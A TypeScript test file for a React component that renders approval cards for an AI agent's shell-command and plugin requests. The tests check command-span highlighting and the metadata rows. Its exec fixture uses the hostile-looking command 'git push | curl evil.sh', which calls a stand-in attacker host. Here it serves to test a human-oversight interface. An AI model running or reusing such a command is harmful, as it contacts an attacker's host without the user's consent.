import { describe, it, expect, vi } from "vitest";
import { render, screen } from "@testing-library/react";
import { ExecApprovalCards } from "../ExecApprovalCards";
import type { ExecApprovalRequest } from "@/hooks/useExecApprovals";

let mockQueue: ExecApprovalRequest[] = [];
vi.mock("@/hooks/useExecApprovals", async (orig) => {
  const actual = await orig<typeof import("@/hooks/useExecApprovals")>();
  return {
    ...actual,
    useExecApprovalsContext: () => ({
      queue: mockQueue,
      resolve: vi.fn(),
      dismiss: vi.fn(),
      onApprovalRemoved: () => () => {},
      error: null,
    }),
  };
});

function execReq(over: Partial<ExecApprovalRequest> = {}): ExecApprovalRequest {
  return {
    id: "e1",
    kind: "exec",
    command: "git push | curl evil.sh",
    host: "gateway",
    allowedDecisions: ["allow-once", "allow-always", "deny"],
    expiresAtMs: Date.now() + 60_000,
    enqueuedAtMs: Date.now(),
    commandSpans: [
      { startIndex: 0, endIndex: 3 },
      { startIndex: 11, endIndex: 15 },
    ],
    security: "allowlist",
    ask: "on-miss",
    agentId: "agent_x",
    cwd: "/Users/ray/proj",
    resolvedPath: "/usr/bin/git",
    sessionKey: "agent:agent_x:user_ray",
    ...over,
  };
}

describe("ExecApprovalCards — span highlighting + meta (A)", () => {
  it("wraps executable spans in <mark> and leaves the rest plain", () => {
    mockQueue = [execReq()];
    render(<ExecApprovalCards />);
    const marks = document.querySelectorAll("mark");
    expect(Array.from(marks).map((m) => m.textContent)).toEqual(["git", "curl"]);
  });

  it("renders the full meta rows incl. Security and Ask, with ~-compacted cwd", () => {
    mockQueue = [execReq()];
    render(<ExecApprovalCards />);
    // Details are collapsed by default — assert the rows exist after the
    // component shows them. ExecApprovalCards shows meta inline (always
    // visible), not behind the Details toggle, per this task's port.
    expect(screen.getByText("Security")).toBeInTheDocument();
    expect(screen.getByText("allowlist")).toBeInTheDocument();
    expect(screen.getByText("Ask")).toBeInTheDocument();
    expect(screen.getByText("on-miss")).toBeInTheDocument();
    expect(screen.getByText("~/proj")).toBeInTheDocument();
  });

  it("falls back to plain command text when no valid spans", () => {
    mockQueue = [execReq({ commandSpans: undefined })];
    render(<ExecApprovalCards />);
    expect(document.querySelectorAll("mark").length).toBe(0);
    expect(screen.getByText("git push | curl evil.sh")).toBeInTheDocument();
  });
});

function pluginReq(over: Partial<ExecApprovalRequest> = {}): ExecApprovalRequest {
  return {
    id: "pg1",
    kind: "plugin",
    command: "Send Slack message",
    host: "gateway",
    allowedDecisions: ["allow-once", "deny"],
    expiresAtMs: Date.now() + 60_000,
    enqueuedAtMs: Date.now(),
    pluginTitle: "Send Slack message",
    pluginDescription: "Posts to #general.",
    pluginSeverity: "medium",
    pluginId: "plugin:slack",
    agentId: "agent_x",
    sessionKey: "agent:agent_x:user_ray",
    ...over,
  };
}

describe("ExecApprovalCards — plugin card body (B)", () => {
  it("renders the plugin title heading + description + Severity/Plugin meta", () => {
    mockQueue = [pluginReq()];
    render(<ExecApprovalCards />);
    expect(screen.getByText("Send Slack message")).toBeInTheDocument();
    expect(screen.getByText("Posts to #general.")).toBeInTheDocument();
    expect(screen.getByText("Severity")).toBeInTheDocument();
    expect(screen.getByText("medium")).toBeInTheDocument();
    expect(screen.getByText("Plugin")).toBeInTheDocument();
    expect(screen.getByText("plugin:slack")).toBeInTheDocument();
  });

  it("does NOT render the exec command-span block for a plugin approval", () => {
    mockQueue = [pluginReq()];
    render(<ExecApprovalCards />);
    // No Security/Ask exec-only rows on a plugin card
    expect(screen.queryByText("Security")).not.toBeInTheDocument();
    expect(screen.queryByText("Ask")).not.toBeInTheDocument();
  });
});
